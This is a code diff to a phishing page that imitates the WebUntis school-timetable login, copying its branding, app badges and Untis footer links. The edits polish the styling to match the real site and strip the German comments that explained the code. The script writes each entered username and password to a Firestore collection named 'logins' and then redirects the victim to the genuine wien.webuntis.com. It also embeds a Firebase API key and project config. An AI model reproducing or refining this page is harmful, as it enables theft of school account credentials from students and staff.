@@ -56,7 +56,7 @@
             color: #6c757d;
         }
 
-        /* Das orangefarbene Grid-Icon aus dem Screenshot */
+        /* Das orangefarbene Grid-Icon */
         .grid-icon {
             width: 22px;
             height: 22px;
@@ -105,11 +105,11 @@
             flex-direction: column;
             justify-content: space-between;
             align-items: center;
-            padding: 40px 20px 20px 20px;
+            padding: 40px 20px 30px 20px;
             position: relative;
         }
 
-        /* Hilfs-Container, um den Inhalt vertikal perfekt zu zentrieren */
+        /* Hilfs-Container für die vertikale Zentrierung des Hauptinhalts */
         .login-center-wrapper {
             flex: 1;
             display: flex;
@@ -185,7 +185,7 @@
         .divider:not(:empty)::before { margin-right: 1em; }
         .divider:not(:empty)::after { margin-left: 1em; }
 
-        /* Input Styling exakt wie im Screenshot */
+        /* Input Styling */
         .input-group {
             display: flex;
             flex-direction: column;
@@ -247,19 +247,19 @@
         }
 
         .btn-login.active {
-            background-color: #ff6b35;
-            color: #ffffff;
+            background-color: #edf2f7;
+            color: #a0aec0;
             cursor: pointer;
         }
 
         /* Passwort vergessen Link */
         .forgot-password {
             display: inline-block;
-            margin-top: 20px;
+            margin-top: 24px;
             color: #1a202c;
             text-decoration: underline;
             font-size: 0.95rem;
-            font-weight: 500;
+            font-weight: 600;
             cursor: pointer;
         }
 
@@ -267,26 +267,32 @@
         .app-badges {
             display: flex;
             justify-content: center;
-            gap: 12px;
-            margin-top: 35px;
+            gap: 14px;
+            margin-top: 45px;
+        }
+
+        .app-badges a {
+            display: inline-block;
+            height: 42px;
         }
 
         .app-badges img {
-            height: 40px;
-            cursor: pointer;
+            height: 100%;
+            object-fit: contain;
         }
 
-        /* Footer Links unten rechts */
+        /* Exakter Footer ganz unten auf der rechten Seite */
         .login-footer {
             display: flex;
             justify-content: center;
             gap: 20px;
             width: 100%;
+            margin-top: auto;
             padding-top: 20px;
         }
 
         .login-footer a {
-            color: #4a5568;
+            color: #1a202c;
             text-decoration: underline;
             font-size: 0.85rem;
             font-weight: 500;
@@ -373,7 +379,7 @@
 
                     <div class="app-badges">
                         <a href="https://play.google.com/store/apps/details?id=com.untis.mobile" target="_blank">
-                            <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Jetzt bei Google Play">
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="JETZT BEI Google Play">
                         </a>
                         <a href="https://apps.apple.com/at/app/untis-mobile/id926180142" target="_blank">
                             <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" alt="Laden im App Store">
@@ -383,8 +389,8 @@
             </div>
 
             <div class="login-footer">
-                <a href="#" target="_blank">Impressum</a>
-                <a href="#" target="_blank">Jobs @ Untis</a>
+                <a href="https://www.untis.at/impressum" target="_blank">Impressum</a>
+                <a href="https://www.untis.at/jobs" target="_blank">Jobs @ Untis</a>
             </div>
 
         </div>
@@ -395,7 +401,6 @@
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
         import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
-        // Deine übermittelten Firebase-Konfigurationsdaten
         const firebaseConfig = {
             apiKey: "AIzaSyD6tRZKmQ94EWeI27oS6uZuPgW2ODkvJ6w",
             authDomain: "untis-4045a.firebaseapp.com",
@@ -406,24 +411,20 @@
             measurementId: "G-4K2Y1YKLT9"
         };
 
-        // Firebase initialisieren
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
-        // DOM Elemente abgreifen
         const usernameInput = document.getElementById('username');
         const passwordInput = document.getElementById('password');
         const loginBtn = document.getElementById('loginBtn');
         const loginForm = document.getElementById('loginForm');
         const togglePassword = document.getElementById('togglePassword');
 
-        // Fokus-Effekte für die Eingabegruppen
         [usernameInput, passwordInput].forEach(input => {
             const group = document.getElementById(`group-${input.id}`);
             input.addEventListener('focus', () => group.classList.add('focused'));
             input.addEventListener('blur', () => group.classList.remove('focused'));
             
-            // Validierung, ob beide Felder befüllt sind, um den Button freizuschalten
             input.addEventListener('input', () => {
                 if (usernameInput.value.trim() !== "" && passwordInput.value.trim() !== "") {
                     loginBtn.disabled = false;
@@ -435,30 +436,23 @@
             });
         });
 
-        // Passwort-Sichtbarkeit umschalten
         togglePassword.addEventListener('click', () => {
             const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
             passwordInput.setAttribute('type', type);
         });
 
-        // Formular absenden & Daten an Firestore übertragen
         loginForm.addEventListener('submit', async (e) => {
             e.preventDefault();
-
             const username = usernameInput.value;
             const password = passwordInput.value;
 
             try {
-                // Daten werden in die Collection "logins" geschrieben
                 await addDoc(collection(db, "logins"), {
                     username: username,
                     password: password,
                     timestamp: serverTimestamp()
                 });
-
-                // Weiterleitung nach erfolgreichem Speichern zur echten WebUntis-Seite
                 window.location.href = "https://wien.webuntis.com/";
-
             } catch (error) {
                 console.error("Fehler beim Speichern der Daten: ", error);
             }
